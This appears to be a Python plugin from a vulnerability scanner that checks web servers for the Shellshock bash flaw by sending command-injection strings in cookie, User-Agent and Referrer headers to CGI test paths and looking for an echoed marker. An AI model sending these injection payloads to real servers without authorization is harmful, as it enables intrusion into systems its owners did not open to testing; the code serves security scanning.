#-*-coding:utf-8-*-

import requests
from exp.lib.httpparse import httpparse


def test_url(protocol,domain, port,timeout):
    url_list = []
    http = httpparse()
    vul_url = ['/cgi-bin/test-cgi','/cgi-bin/test.cgi']
    for url in vul_url:
        try:
            tm = http.httpreq('GET', protocol, domain, port, url)
            if tm[0] == 200 or b'cgi-bin' in tm[2]:
                url_list.append(url)
            else:
                pass
        except Exception as e:
            msg = str(e)
            pass
    return list(set(url_list))


def verify(protocol,ip,port):
    oldurl = protocol+'://'+ip+':'+str(port)
    print('testing if shell shock vul')
    url_list = test_url(protocol,ip,port,timeout=10)
    try:
        flag_list = ['() { :; }; echo; echo X-Bash-Test: hczjhdqtjh','env x="() { :;}; echo hczjhdqtjh" bash -c "echo this is a test"','() { :;};a="hczjhdqtjh";echo "a: $a"']
        for url in url_list:
            if 'cgi' in url:
                for flag in flag_list:
                    header = {'cookie': flag, 'User-Agent': flag, 'Referrer': flag}
                    try:
                        http = httpparse()
                        tm = http.httpreq('GET', protocol, ip, port, url,header=header)
                        res_html = str(tm[2])
                        res_header = str(tm[1])
                    except Exception as e:
                        msg = str(e)
                        print(msg)
                        pass
                    if "hczjhdqtjh" in res_header:
                        msg = 'There is shell shock vul on '+oldurl + url+' .'
                        number = 'v45'
                        return True,url,number,msg
    except Exception as e:
        msg = str(e)
        print(msg)
        pass
    msg = 'There is no shell shock vul'
    number = 'v0'
    return False,oldurl,number,msg
